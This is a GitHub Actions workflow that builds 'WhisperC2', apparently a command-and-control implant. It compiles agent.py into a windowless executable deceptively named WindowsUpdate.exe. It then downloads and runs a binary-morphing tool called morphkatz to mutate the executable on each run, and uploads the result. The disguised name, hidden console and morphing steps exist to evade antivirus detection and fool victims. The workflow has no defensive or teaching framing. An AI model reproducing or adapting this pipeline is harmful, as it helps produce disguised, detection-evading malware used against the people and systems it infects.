name: Build WhisperC2 (Morphed)

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pyinstaller

      - name: Build EXE with PyInstaller
        run: |
          pyinstaller --onefile --noconsole --icon=69.ico --name WindowsUpdate agent.py

      - name: Download MorphKatz
        run: |
          curl -L -o morphkatz.exe https://github.com/0xMohammedHassan/morphkatz/releases/latest/download/morphkatz.exe
        continue-on-error: true

      - name: Morph the binary
        if: success()
        run: |
          .\morphkatz.exe dist\WindowsUpdate.exe --seed ${{ github.run_number }} --data-morph on
        continue-on-error: true

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: WhisperC2
          path: dist/WindowsUpdate.exe
